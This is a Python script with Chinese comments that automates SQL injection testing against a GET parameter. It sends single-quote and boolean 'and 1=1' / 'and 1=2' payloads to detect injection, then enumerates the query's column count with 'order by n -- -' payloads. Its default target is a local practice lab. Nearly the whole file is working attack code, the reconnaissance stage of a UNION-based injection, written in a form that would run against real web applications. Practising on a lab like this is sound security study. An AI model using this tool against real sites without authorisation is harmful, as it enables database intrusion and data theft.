import requests
import logging

# 修复日志格式：补全百分号占位符
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s"
)

TIMEOUT = 5
ERROR_KEYWORDS = [
    "SQL syntax", "mysql_fetch", "Unknown column",
    "error in your SQL", "XPATH syntax error",
    "Operand should contain", "You have an error"
]


def send_request(url):
    """统一HTTP请求函数,处理超时、连接异常"""
    try:
        resp = requests.get(url, timeout=TIMEOUT, allow_redirects=False)
        return resp
    except Exception as e:
        logging.debug(f"请求失败: {e}")
        return None


def get_baseline(url):
    """获取正常页面基线，用于对比判定"""
    resp = send_request(url)
    if not resp or not resp.text:
        return None
    return {
        "length": len(resp.text),
        "status": resp.status_code,
        "text": resp.text
    }


def check_sql_injection(base_url, param_name):
    """检测GET参数是否存在SQL注入，返回(是否存在, 注入类型)"""
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("目标页面无法访问，检测终止")
        return False, ""

    # 二次确认基线稳定
    baseline2 = get_baseline(base_url)
    if not baseline2 or abs(baseline2["length"] - baseline["length"]) > 10:
        logging.warning("页面内容不稳定，检测结果可能存在误差")

    # 字符型注入测试（单引号触发报错）
    test_char = base_url.replace(f"{param_name}=1", f"{param_name}=1'")
    resp_char = send_request(test_char)
    
    if resp_char and resp_char.text:
        has_error = any(key in resp_char.text for key in ERROR_KEYWORDS)
        len_diff = abs(len(resp_char.text) - baseline["length"])
        
        if has_error and len_diff > 20:
            logging.info(f"检测到字符型SQL注,参数:{param_name}")
            return True, "字符型报错注入"

    # 数字型注入测试（逻辑真假对比）
    true_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=1")
    false_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=2")
    
    resp_true = send_request(true_url)
    resp_false = send_request(false_url)
    
    if resp_true and resp_false and resp_true.text and resp_false.text:
        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        if abs(len_true - baseline["length"]) < 10 and abs(len_true - len_false) > 20:
            logging.info(f"检测到数字型SQL注入,参数:{param_name}")
            return True, "数字型注入"

    return False, ""


def guess_columns(base_url, param_name, max_columns=10, inject_type="数字型注入"):
    """自动猜解查询字段列数，兼容字符型/数字型注入"""
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("无法获取页面基线，猜解失败")
        return 0

    base_len = baseline["length"]
    # 长度变化阈值：相对比例15% + 最小差值10，适配不同大小的页面
    len_threshold = max(int(base_len * 0.15), 10)

    for n in range(1, max_columns + 1):
        # 根据注入类型生成payload，使用兼容性更强的 -- - 注释
        if "字符型" in inject_type:
            payload = f"1' order by {n} -- -"
        else:
            payload = f"1 order by {n} -- -"
        
        test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
        resp = send_request(test_url)
        
        if not resp or not resp.text:
            return 0

        resp_len = len(resp.text)
        has_error = any(key in resp.text for key in ERROR_KEYWORDS)
        len_diff = abs(resp_len - base_len)

        # 触发报错 或 长度变化超过阈值 → 超出列数
        if has_error or len_diff > len_threshold:
            result = n - 1
            logging.info(f"列数猜解完成：{result} 列")
            return result

    logging.warning(f"列数超过上限 {max_columns}，请扩大范围")
    return max_columns


if __name__ == "__main__":
    target = "http://localhost:8080/Less-1/?id=1"
    param = "id"
    
    logging.info(f"开始检测目标：{target}")
    has_inject, inject_type = check_sql_injection(target, param)
    
    if has_inject:
        logging.info(f"注入类型：{inject_type}")
        columns = guess_columns(target, param, inject_type=inject_type)
        logging.info(f"查询字段数：{columns}")
    else:
        logging.info("未检测到SQL注入")





        



    
       
    




    



